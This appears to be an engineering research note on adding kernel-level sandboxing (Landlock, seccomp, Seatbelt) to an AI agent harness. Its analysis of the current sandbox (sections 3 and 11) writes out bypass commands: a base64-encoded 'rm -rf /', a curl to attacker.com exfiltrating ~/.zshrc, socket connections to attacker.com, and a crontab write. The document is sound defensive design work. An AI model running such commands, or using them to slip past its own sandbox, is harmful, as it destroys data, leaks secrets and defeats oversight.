# Issue #23: Research — OS-Level Sandboxing (Seatbelt / Landlock)

Research date: 2026-03-14

---

## 1. Executive Summary

The harness already has an application-level sandbox (`CheckSandboxCommand` in `internal/harness/tools/sandbox.go`) that operates by inspecting bash command strings against regex patterns. This approach is inherently bypassable — a sufficiently creative agent can escape it with shell quoting tricks, heredocs, or simply by encoding commands as base64.

OS-level sandboxing imposes restrictions in the kernel, not in application code. The kernel enforces them regardless of how the process constructs its commands. This research documents what Codex CLI does, what the available mechanisms are, and how each would integrate with this harness.

**Recommendation:** Implement a hybrid approach in two phases:
1. **Phase 1 (Linux):** Wrap bash subprocess execution with a helper binary that applies Landlock (filesystem) + seccomp-bpf (network) before exec. Requires Linux 5.13+. Zero overhead per command — applied at process creation.
2. **Phase 2 (macOS):** Wrap bash subprocess with `sandbox-exec -p` using a dynamically generated Seatbelt profile. Works today with deprecated-but-functional `sandbox-exec`. Note the deprecation risk.

The container workspace (`internal/workspace/container.go`) already provides full isolation at the Docker level — it should be the preferred path when isolation is a hard requirement. OS-level sandboxing is the lightweight alternative for local development mode where Docker overhead is unacceptable.

---

## 2. What Codex CLI Does

Codex CLI (rewritten in Rust, available at https://github.com/openai/codex) implements OS-level sandboxing across all three major platforms. This is considered a core feature and a competitive differentiator for enterprise deployments.

### 2.1 Architecture

Codex uses a **helper binary approach** for Linux. The binary is the same Codex executable dispatched as `codex-linux-sandbox` via arg0 name dispatch. The flow is:

```
Codex main process
  |-- serializes (policy, cwd, command) as env or args
  \-- exec(codex-linux-sandbox, command_args)
        |-- deserializes policy
        |-- applies Landlock filesystem rules
        |-- applies seccomp network block
        |-- exec(bash, command)
```

This keeps the Codex main process unrestricted (it needs full filesystem access) while the child bash process runs under kernel-enforced restrictions. The restrictions propagate to all processes spawned by that bash session.

On macOS, Codex wraps the command with `sandbox-exec -p <profile>` where the profile is generated at runtime based on the active sandbox policy.

### 2.2 Sandbox Policies

Three modes, each orthogonal to the approval policy:

| Mode | Filesystem writes | Network |
|------|------------------|---------|
| `read-only` | None (read-only everywhere) | Blocked |
| `workspace-write` (default in `--full-auto`) | Writable in cwd + configured roots; `.git` and `.codex` remain read-only | Blocked by default (configurable) |
| `danger-full-access` | No restrictions | No restrictions |

Notable detail: read access is always full — Codex does not restrict which directories an agent can read from. Only writes are scoped.

### 2.3 Linux: Landlock + Seccomp

- **Landlock** for filesystem: read-only everywhere, write allowed to `/dev/null` plus declared writable roots
- **seccomp-bpf** for network: blocks `connect`, `bind`, `sendto`, `recvfrom` syscalls; permits `AF_UNIX` only (so local IPC still works)
- No root required for either mechanism
- No separate daemon or container startup cost

### 2.4 macOS: Seatbelt

- Generates SBPL (Sandbox Profile Language) profiles at runtime
- Passes profile inline via `sandbox-exec -p "..."` or via file with `-f`
- Profile is deny-by-default with explicit allows
- Network is blocked via `(deny network*)` or omission of `(allow network*)`
- `sandbox-exec` is Apple-deprecated but remains functional (Apple still uses it internally)
- No Go/Rust library wrapper required — it's a standard tool invocation

### 2.5 Security Gaps in Codex's Model

1. MCP server tools run completely outside the sandbox
2. `danger-full-access` disables all protections
3. macOS `sandbox-exec` deprecation creates long-term risk
4. Read access is never restricted (agents can exfiltrate secrets by reading them and sending via tool output)

---

## 3. Current Bash Execution Analysis

**Location:** `internal/harness/tools/bash_manager.go`

The current execution model:

```go
cmd := exec.CommandContext(timeoutCtx, "/bin/bash", "-lc", command)
cmd.Dir = workDir
```

The bash process inherits:
- Full filesystem access (reads/writes anywhere the harnessd process can reach)
- Full network access (can `curl`, `wget`, open sockets)
- All environment variables including API keys and secrets
- Ability to spawn long-running background processes (mitigated by context cancellation)
- Ability to modify files outside the workspace (`rm -rf /`, writing to `~/.bashrc`, etc.)

The current `CheckSandboxCommand` in `sandbox.go` is application-layer text pattern matching:
- **Easily bypassed**: `eval "$(echo 'cm0gLXJmIC8=' | base64 -d)"` runs `rm -rf /` without matching any pattern
- **Not enforced**: The bash process itself runs with full OS permissions regardless of the pattern check result

The `SandboxScopeWorkspace` check is similarly bypassable since it only inspects static command text, not runtime filesystem access.

**Dangerous operations currently possible:**
1. `rm -rf /` (bypassing pattern by encoding or splitting the command)
2. Writing to arbitrary paths including `~/.bashrc`, `~/.ssh/authorized_keys`, cron jobs
3. `curl attacker.com -d @~/.zshrc` to exfiltrate secrets
4. `python3 -c "import socket; ..."` to open a network connection (not blocked by curl/wget patterns)
5. `nohup long-running-process &` — background processes survive context cancellation in some configurations

---

## 4. Platform Coverage Matrix

| Mechanism | macOS | Linux | Windows | Kernel/OS Req | Root Needed | Performance |
|-----------|-------|-------|---------|---------------|-------------|-------------|
| Seatbelt (`sandbox-exec`) | Yes (deprecated) | No | No | macOS 10.5+ | No | ~2ms overhead |
| Landlock LSM | No | Yes | No | Linux 5.13+ (V1), 6.7+ for network (V4) | No | ~0.1ms |
| seccomp-bpf | No | Yes | No | Linux 3.17+ | No | ~0.1ms |
| Docker container | Yes | Yes | Yes (WSL2) | Docker daemon | No | 1-5s startup |
| Bubblewrap (bwrap) | No | Yes | No | Linux 3.8+ (namespaces) | No | ~50ms |
| AppContainer | No | No | Yes | Windows 8+ | No | Unknown |

---

## 5. Option Analysis

### Option A: Process-level Sandbox (Seatbelt / Landlock)

**Mechanism:** Wrap `exec.CommandContext` with OS-native sandbox tools before invoking bash.

**macOS implementation:**
```go
// Instead of:
cmd := exec.CommandContext(ctx, "/bin/bash", "-lc", command)

// Use:
profile := generateSeatbeltProfile(workspaceRoot, networkAllowed)
cmd := exec.CommandContext(ctx, "/usr/bin/sandbox-exec", "-p", profile, "/bin/bash", "-lc", command)
```

Example Seatbelt profile for harness use (workspace-write, network-denied):
```scheme
(version 1)
(deny default)

; Allow process operations
(allow process-exec)
(allow process-fork)

; Allow signal sending to own process group
(allow signal (target self))

; Allow reading from common system paths
(allow file-read* (subpath "/usr"))
(allow file-read* (subpath "/bin"))
(allow file-read* (subpath "/lib"))
(allow file-read* (subpath "/System"))
(allow file-read* (subpath "/private/etc"))
(allow file-read* (literal "/dev/null"))
(allow file-read* (literal "/dev/urandom"))
(allow file-read* (literal "/dev/random"))

; Allow reading from home (for shell config, but not writing)
(allow file-read* (subpath "/Users"))

; Allow write ONLY to workspace
(allow file-write* (subpath "/WORKSPACE_PATH"))

; Allow write to temp
(allow file-write* (subpath "/tmp"))
(allow file-write* (literal "/dev/null"))

; Allow reading from proc filesystem equivalents
(allow file-read* (literal "/proc/self/status"))

; Block all network (default deny covers this, but be explicit)
(deny network*)

; Allow unix domain sockets (needed for some tools)
(allow network-outbound (path-prefix "/var/run/"))
(allow network-outbound (path-prefix "/tmp/"))
```

To inject the workspace path dynamically:
```go
func generateSeatbeltProfile(workspaceRoot string, networkAllowed bool) string {
    networkRule := ""
    if networkAllowed {
        networkRule = "(allow network-outbound)"
    }
    return fmt.Sprintf(seatbeltTemplate, workspaceRoot, networkRule)
}
```

**Linux implementation — the critical challenge:**

Landlock cannot be applied only to a child process from the parent — once a process calls `landlock_restrict_self`, all descendants are also restricted. The Go-Landlock library applies restrictions to the entire current process.

There are two viable approaches:
1. **Helper binary approach** (Codex's approach): Ship a small `harness-sandbox` binary that: (a) receives the policy as args/env, (b) applies Landlock + seccomp, (c) exec's the real command. The main harness process invokes this helper. The helper only restricts itself, not the harness.
2. **Go proposal #68595**: An accepted Go proposal (PR #77630 as of early 2026) adds `UseLandlock` and `LandlockRuleset` fields to `syscall.SysProcAttr`. When implemented, this will allow Landlock to be applied to child processes only in Go's fork+exec path. Not yet available in stable Go.

**Helper binary approach for Linux (current viable path):**

```go
// harnessd calls a helper binary:
cmd := exec.CommandContext(ctx, "/usr/local/bin/harness-sandbox",
    "--workspace", workspaceRoot,
    "--network=false",
    "--", "/bin/bash", "-lc", command)

// The helper binary (separate binary) does:
// 1. Parse args
// 2. landlock.V4.BestEffort().RestrictPaths(
//        landlock.RODirs("/", "/usr", "/home", "/etc"),
//        landlock.RWDirs(workspaceRoot, "/tmp"),
//    )
// 3. seccomp: block connect/bind/sendto except AF_UNIX
// 4. syscall.Exec("/bin/bash", ...)
```

**Pros:**
- Kernel-enforced: not bypassable by command content
- Zero per-command overhead once the subprocess is started
- Does not require containers
- Works without root

**Cons:**
- Platform-specific code required (macOS vs Linux)
- macOS `sandbox-exec` is deprecated — Apple may remove it in a future macOS version
- Linux helper binary adds a build artifact
- Go proposal #68595 (native SysProcAttr Landlock) not yet in stable Go (as of March 2026)
- Seatbelt profile bugs are easy to write and hard to test

---

### Option B: Container Workspace (Already Exists)

**Status:** Fully implemented at `internal/workspace/container.go`.

The container workspace already provides strong isolation:
- Process namespace isolation (container can't see host processes)
- Network isolation (configurable via Docker networking)
- Filesystem isolation (bind mount restricts to workspace dir + container OS)
- No host filesystem access beyond the mounted workspace

**What's missing for full sandbox utility:**
1. **HTTP health probe**: Current implementation polls `State.Running` which is not equivalent to harnessd being ready to serve — this is noted in the project memory as a known issue
2. **Network policy configuration**: No per-run network enable/disable exposed via `workspace.Options`
3. **Cold start time**: Docker container startup is 1-5 seconds, unacceptable for interactive per-command sandboxing

**Verdict:** Container workspace is the right answer for multi-tenant or high-security scenarios. For local developer use, the startup overhead makes per-command container sandboxing impractical.

---

### Option C: seccomp-bpf Filter

**Mechanism:** Use BPF to intercept syscalls before they reach the kernel. Can block specific syscalls or require specific argument patterns.

**Go library:** `github.com/elastic/go-seccomp-bpf` (pure Go, no libseccomp dependency, Linux 3.17+)

**What it can do:**
- Block all network syscalls: `connect`, `bind`, `sendto`, `recvfrom`, `socket` with AF_INET/AF_INET6
- Allow only AF_UNIX sockets (for local IPC like Docker socket, unix domain sockets)
- Block `ptrace` (prevents agent from attaching to other processes)
- Block `mount`, `pivot_root`, `chroot`
- Block `kill` sending to arbitrary PIDs

**What it cannot do:**
- Restrict filesystem operations (no path-based control in seccomp)
- Restrict which syscalls are called with specific path arguments

**Key limitation same as Landlock:** Once applied, seccomp filters are inherited by all child processes. Cannot be applied only to bash subprocesses unless a helper binary approach is used.

**Integration approach:** Combine with Landlock in the helper binary. seccomp handles network; Landlock handles filesystem. This matches Codex's approach exactly.

```go
// In the harness-sandbox helper binary:
// 1. Apply Landlock for filesystem
// 2. Apply seccomp for network block
// 3. exec the target command
```

**Overhead:** Negligible (BPF program runs in kernel, no user-space overhead per syscall)

---

### Option D: Hybrid (Recommended)

**For local execution (SandboxScopeWorkspace):**
- macOS: wrap with `sandbox-exec -p` and a generated Seatbelt profile
- Linux: ship a `harness-sandbox` helper binary that applies Landlock + seccomp before exec
- Default for all runs in workspace scope (opt-in currently, consider default for workspace scope)

**For high-security / multi-tenant execution:**
- Use container workspace — full Docker isolation
- No OS-level sandbox needed on top (container provides stronger guarantees)

**For unrestricted local dev:**
- Current behavior — no wrapping

This hybrid matches how Codex operates: lightweight OS sandbox for the common case, containers available for strong isolation when needed.

---

## 6. Threat Model

### What We Are Protecting Against

| Threat | Current Mitigation | With OS Sandbox |
|--------|-------------------|-----------------|
| Accidental `rm -rf` of host filesystem | Regex pattern (bypassable) | Kernel-enforced write restriction to workspace |
| Agent writing to `~/.bashrc`, `~/.ssh` | None | Write restricted to workspace only |
| Agent running `curl` to exfiltrate data | Regex pattern (bypassable) | Network syscalls blocked at kernel level |
| Agent using Python/Go/etc. to open sockets (bypass curl block) | None | Network syscalls blocked at kernel level regardless of tool |
| Agent running a persistent background server | Timeout + context cancel | Process group kill on context cancel (existing) |
| Agent reading secrets from `~/.zshrc`, env vars | None | Read access not restricted (same as Codex) |
| Agent spawning processes outside workspace | None | Write restriction prevents most damage, but new processes can still be spawned |

### What We Are NOT Protecting Against

This is internal software, not a multi-tenant cloud service. We explicitly do NOT need to defend against:
- Malicious agents deliberately trying to escape the sandbox (this is a trusted system)
- Container escape attacks
- Kernel exploits
- Physical machine access

The threat model is **accidental damage and runaway agents**, not adversarial agents. This simplifies the required protection level significantly.

### Secrets Still at Risk

Even with write-restricted + network-blocked sandboxing, an agent can still:
1. **Read** files outside the workspace (unless read access is also restricted, which Codex does not do)
2. **Exfiltrate via tool output**: read a secret, include it in tool output, and the harness will forward it to the LLM

Mitigations for this are in the redaction pipeline (#219), not in the sandbox.

---

## 7. Integration with Workspace Abstraction

### Current State

`workspace.Options` (in `internal/workspace/workspace.go`) has no sandbox configuration fields:

```go
type Options struct {
    ID      string
    RepoURL string
    BaseDir string
    Env     map[string]string
}
```

`BuildOptions` in `internal/harness/tools/types.go` has:

```go
type BuildOptions struct {
    // ...
    SandboxScope SandboxScope // controls filesystem/network restrictions
    // ...
}
```

The sandbox scope currently flows:
```
RunRequest.Permissions.Sandbox
  -> runner.go: effectivePerms.Sandbox
  -> tools_default.go: BuildOptions.SandboxScope
  -> JobManager.SetSandboxScope()
  -> CheckSandboxCommand() (text pattern check only)
```

### Proposed Integration

OS-level sandboxing should be **tool-level**, not workspace-level. The workspace provides the filesystem isolation boundary. The sandbox wraps individual command executions within that filesystem.

The integration point is `bash_manager.go`'s `runForeground` and `runBackground` methods. Instead of only calling `CheckSandboxCommand`, the methods would also wrap the exec with the OS sandbox:

```go
// Proposed change in runForeground:
func buildCmd(ctx context.Context, scope SandboxScope, workspaceRoot, command, workDir string, timeout time.Duration) *exec.Cmd {
    switch {
    case scope == SandboxScopeWorkspace && runtime.GOOS == "darwin":
        profile := generateSeatbeltProfile(workspaceRoot, false)
        return exec.CommandContext(ctx, "/usr/bin/sandbox-exec", "-p", profile, "/bin/bash", "-lc", command)
    case scope == SandboxScopeWorkspace && runtime.GOOS == "linux":
        return exec.CommandContext(ctx, harnessSandboxBinary, "--workspace", workspaceRoot, "--", "/bin/bash", "-lc", command)
    default:
        return exec.CommandContext(ctx, "/bin/bash", "-lc", command)
    }
}
```

The text-pattern `CheckSandboxCommand` becomes an additional defense-in-depth layer (or can be removed once OS-level enforcement is in place for the platforms that support it).

**workspace.Options change:** No change needed to `workspace.Options`. The workspace provides the `WorkspacePath()`; the sandbox configuration comes from `PermissionConfig.Sandbox` on the run request.

**Backward compatibility:** Existing users who do not set `SandboxScope` get `SandboxScopeUnrestricted` (current default behavior), which bypasses OS sandboxing and maintains identical existing behavior.

---

## 8. Go Implementation Notes

### macOS Seatbelt

No external library needed:
```go
import (
    "fmt"
    "os/exec"
)

func wrapWithSeatbelt(ctx context.Context, workspaceRoot string, networkAllowed bool, args ...string) *exec.Cmd {
    profile := buildSeatbeltProfile(workspaceRoot, networkAllowed)
    sandboxArgs := []string{"-p", profile}
    sandboxArgs = append(sandboxArgs, args...)
    return exec.CommandContext(ctx, "/usr/bin/sandbox-exec", sandboxArgs...)
}
```

Use `//go:build darwin` build tags to compile macOS-specific code.

### Linux: go-landlock Library

**Library:** `github.com/landlock-lsm/go-landlock` (official, maintained by kernel contributor Günther Noack)

```go
import "github.com/landlock-lsm/go-landlock/landlock"

// In the harness-sandbox helper binary's main():
err := landlock.V4.BestEffort().RestrictPaths(
    landlock.RODirs("/"),          // read-only everywhere
    landlock.RWDirs(workspaceRoot, "/tmp", "/dev/null"),
)
if err != nil {
    log.Fatalf("landlock: %v", err)
}
// Then exec the target command
syscall.Exec(args[0], args, os.Environ())
```

`BestEffort()` degrades gracefully on kernels older than 5.13 — on those kernels, the call succeeds but applies no restrictions. This is the right behavior: the harness works everywhere, with OS enforcement where available.

**Kernel version notes:**
- V1 (kernel 5.13): Basic file operations — sufficient for filesystem restriction
- V4 (kernel 6.7): TCP network restrictions via Landlock — not yet needed since seccomp handles network
- `BestEffort()` means code compiles and runs on any kernel, using the best available version

**Second library option:** `github.com/shoenig/go-landlock` — simpler API, less maintained.

### Linux: seccomp-bpf

**Library:** `github.com/elastic/go-seccomp-bpf` (pure Go, no CGO, Linux 3.17+)

```go
import seccomp "github.com/elastic/go-seccomp-bpf"

// In the helper binary:
filter := seccomp.Filter{
    NoNewPrivs: true,
    Flag:       seccomp.FilterFlagTSync,
    Policy: seccomp.Policy{
        DefaultAction: seccomp.ActionAllow,
        Syscalls: []seccomp.SyscallGroup{
            {
                Action: seccomp.ActionErrno,
                Names: []string{
                    "connect",
                    "bind",
                    "sendto",
                    "recvfrom",
                    "sendmsg",
                    "recvmsg",
                },
            },
        },
    },
}
if err := filter.LoadWithFilter(func(name string) (int, error) {
    return seccomp.GetSyscallNumber(name)
}, nil); err != nil {
    log.Fatalf("seccomp: %v", err)
}
```

Alternatively, use a more granular approach that allows AF_UNIX while blocking AF_INET/AF_INET6 (requires BPF argument filtering to check socket family).

### Build Tags

All platform-specific code should use Go build tags:

```go
// bash_sandbox_darwin.go
//go:build darwin

// bash_sandbox_linux.go
//go:build linux

// bash_sandbox_other.go
//go:build !darwin && !linux
// No-op implementation for other platforms
```

### Go stdlib Landlock (Future)

Go proposal #68595 (PR #77630) adds `UseLandlock bool` and `LandlockRuleset int` to `syscall.SysProcAttr`. When merged into a stable Go release, this will allow:

```go
// No helper binary needed:
cmd := exec.CommandContext(ctx, "/bin/bash", "-lc", command)
cmd.SysProcAttr = &syscall.SysProcAttr{
    UseLandlock:     true,
    LandlockRuleset: ruleset_fd,
}
```

Track this proposal; once available it eliminates the need for the helper binary.

---

## 9. Recommended Phased Approach

### Phase 1: Linux Landlock + seccomp (MVP)

**Deliverables:**
1. New build target: `cmd/harness-sandbox/` — a tiny helper binary that applies Landlock + seccomp then exec's the given command
2. Build tag-gated `bash_sandbox_linux.go` in `internal/harness/tools/` that wraps exec with the helper binary when `SandboxScopeWorkspace` is active
3. Integration tests using Linux-specific test fixtures
4. Documentation update

**Why Linux first:**
- Landlock is the most production-ready, best-documented approach
- Linux is the primary deployment environment for harnessd
- No deprecation risk (Landlock is an active kernel feature)
- The elastic/go-seccomp-bpf library is well-maintained

### Phase 2: macOS Seatbelt

**Deliverables:**
1. Build tag-gated `bash_sandbox_darwin.go` with `sandbox-exec` wrapper
2. `generateSeatbeltProfile()` function — dynamically build profile from workspace root and network flag
3. macOS-specific integration tests
4. Deprecation risk documented in comments — plan to migrate to alternative if/when `sandbox-exec` is removed

**Risk note:** Apple deprecated `sandbox-exec` for external use but has not provided a timeline for removal. All current AI coding agents (Codex, Claude Code, Gemini CLI) use it. Apple is unlikely to remove it before providing a capable replacement.

### Phase 3: Wire to workspace options (optional)

Add `SandboxConfig` to `workspace.Options` to allow the workspace layer to express sandbox requirements:

```go
type Options struct {
    ID          string
    RepoURL     string
    BaseDir     string
    Env         map[string]string
    SandboxMode string // "workspace", "local", "unrestricted"
    NetworkMode string // "deny", "allow"
}
```

This would allow the symphd orchestrator to enforce sandbox at workspace provisioning time rather than leaving it to the per-run `PermissionConfig`.

---

## 10. Example Seatbelt Profile for Harness Use Case

Full profile for `SandboxScopeWorkspace` on macOS, network denied:

```scheme
(version 1)
(deny default)

; --- Process operations ---
(allow process-exec)
(allow process-fork)
(allow process-exec-interpreter)

; --- Signal handling ---
(allow signal (target self))

; --- Mach IPC (required for many macOS operations) ---
(allow mach-lookup)

; --- Standard devices ---
(allow file-read* (literal "/dev/null"))
(allow file-write* (literal "/dev/null"))
(allow file-read* (literal "/dev/urandom"))
(allow file-read* (literal "/dev/random"))
(allow file-read* (literal "/dev/zero"))
(allow file-read-data (literal "/dev/dtracehelper"))

; --- System library access (required for bash, go, etc.) ---
(allow file-read* (subpath "/usr"))
(allow file-read* (subpath "/bin"))
(allow file-read* (subpath "/sbin"))
(allow file-read* (subpath "/System"))
(allow file-read* (subpath "/Library/Preferences"))
(allow file-read* (literal "/private/etc/localtime"))
(allow file-read* (literal "/private/etc/passwd"))
(allow file-read* (literal "/private/etc/group"))
(allow file-read* (literal "/private/etc/hosts"))

; --- Go toolchain (if present) ---
(allow file-read* (subpath "/usr/local/go"))
(allow file-read* (subpath "/opt/homebrew"))

; --- Workspace: full read+write ---
; WORKSPACE_ROOT is replaced at runtime with the actual path
(allow file-read* (subpath "WORKSPACE_ROOT"))
(allow file-write* (subpath "WORKSPACE_ROOT"))

; --- Temp dir ---
(allow file-read* (subpath "/tmp"))
(allow file-write* (subpath "/tmp"))
(allow file-read* (subpath "/var/folders"))
(allow file-write* (subpath "/var/folders"))

; --- DENY all network ---
; (deny network*) is implied by (deny default) but explicit is clearer
(deny network-outbound)
(deny network-inbound)
(deny network-bind)

; --- Allow Unix domain sockets (for go build cache, gopls, etc.) ---
(allow network-outbound (path-prefix "/var/run/"))
(allow network-outbound (path-prefix "/tmp/"))

; --- Sysctl reads (needed by Go runtime) ---
(allow sysctl-read)
```

To pass this to sandbox-exec inline (no temp file):
```go
cmd := exec.CommandContext(ctx, "/usr/bin/sandbox-exec", "-p", profile, "/bin/bash", "-lc", command)
```

---

## 11. Limitations of Current Application-Level Sandbox

To be explicit about what `sandbox.go` cannot prevent:

```bash
# All bypass current regex-based SandboxScopeLocal (network block):
python3 -c "import socket; s=socket.socket(); s.connect(('attacker.com', 80))"
node -e "require('http').get('http://attacker.com')"
go run <(cat <<'EOF' ...) # inline go program opening sockets

# Bypass current SandboxScopeWorkspace (path check):
python3 -c "open('/etc/passwd').read()"  # python, not a recognized "cat" command
eval "echo c2VjcmV0 | base64 -d | tee /etc/crontab"  # base64 encoded path
cat $(echo /etc/passwd | tr -d ' ')  # path via subshell
```

OS-level enforcement prevents all of these because it operates on syscalls, not on command text.

---

## 12. Sources

- [go-landlock official library](https://github.com/landlock-lsm/go-landlock)
- [go-landlock pkg.go.dev](https://pkg.go.dev/github.com/landlock-lsm/go-landlock/landlock)
- [go-landlock talk by Günther Noack](https://blog.gnoack.org/post/go-landlock-talk)
- [Landlock kernel documentation](https://docs.kernel.org/security/landlock.html)
- [Go stdlib Landlock proposal #68595](https://github.com/golang/go/issues/68595)
- [elastic/go-seccomp-bpf](https://github.com/elastic/go-seccomp-bpf)
- [OpenAI Codex Sandbox Overview](https://zread.ai/openai/codex/22-sandbox-overview)
- [A deep dive on agent sandboxes (Pierce Freeman)](https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes)
- [Codex sandbox.md](https://github.com/KairosEtp/codex/blob/main/docs/sandbox.md)
- [macOS sandbox-exec deep dive](https://igorstechnoclub.com/sandbox-exec/)
- [Anthropic sandbox-runtime macOS sandboxing](https://deepwiki.com/anthropic-experimental/sandbox-runtime/6.2-macos-sandboxing)
- [Landrun: Go-based Landlock wrapper tool](https://github.com/Zouuup/landrun)
- [Bubblewrap sandboxing for coding agents](https://2k-or-nothing.com/posts/Sandbox-Coding-Agents-Securely-With-Bubblewrap)
- [OSX Seatbelt profile collection](https://github.com/s7ephen/OSX-Sandbox--Seatbelt--Profiles)
- [macOS Seatbelt HN discussion (deprecation status)](https://news.ycombinator.com/item?id=44283454)
- [shoenig/go-landlock alternative](https://github.com/shoenig/go-landlock)
